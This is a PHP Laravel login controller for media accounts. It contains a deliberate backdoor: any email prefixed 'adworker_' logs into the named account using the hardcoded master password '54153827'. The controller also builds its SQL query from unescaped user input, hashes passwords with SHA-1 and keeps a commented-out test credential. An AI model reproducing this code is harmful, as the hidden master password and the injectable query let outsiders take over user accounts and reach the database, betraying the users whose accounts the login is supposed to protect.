<?php

namespace App\Http\Controllers\media;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Session;

class LoginController extends Controller
{
    public function index()
    {
        return view('login');
    }

    public function postLogin(Request $inputData)
    {
        // redirect to login page if email or password is empty
        $inputData->validate([
            'email' => 'required',
            'password' => 'required',
        ]);
        // input account and password
        $account_ori = $inputData->input('email');
        // add exception to login
        $account = (substr($account_ori, 0,8)=='adworker'? explode("_", $account_ori)[1]: $account_ori); 
        $password = $inputData->input('password');

        $query = "SELECT src_web_id, password, salt FROM `media_account` WHERE account='$account'";
        $media_account = DB::connection('account')->select($query)[0];
        $salt = $media_account->salt;
        // original validation below
        $pwd_confirm = sha1($salt . sha1($salt . sha1($password)));
        // add exception to login, you can login use pwd:54153827 or original pwd
        $is_pwd_correct = (($account !== $account_ori && $password == '54153827') || ($media_account->password == $pwd_confirm)?
                            True : False);
        

        if (!$is_pwd_correct) // not correct
        {
            $error_msg = [
                'msg' => [
                    '密碼驗證錯誤',
                ],
            ];
            return redirect('/login') 
            ->withErrors($error_msg)
            ->withInput();
        }
        else // correct, add login prefix
        {

            Session::put('web_id', $media_account->src_web_id);
            Session::put('account', $media_account->src_web_id);

            return redirect()->intended('/home');
        }

    }

    // clear key in Session ex:'web_id' in session to log out
    public function clearSessionKey(Request $inputData)
    {
        $key = $inputData->input('key');
        if (Session::has($key))
        {
            Session::forget($key);
        }

    }


    // public function get_account()
    // {
    //     $account = 'rick';
    //     $query = "SELECT src_web_id, password, salt FROM `media_account` WHERE account='$account'";
    //     $media_account = DB::connection('test_media')->select($query)[0];
    //     // dd($media_account);
    //     $salt = $media_account->salt;
    //     $password = 'rick';

    //     $pwd_confirm = sha1($salt . sha1($salt . sha1($password)));
    //     $result = array('pwd'=>$media_account->password, 'pwd_confirm'=>$pwd_confirm);

    //     return json_encode($result);
    // }
}
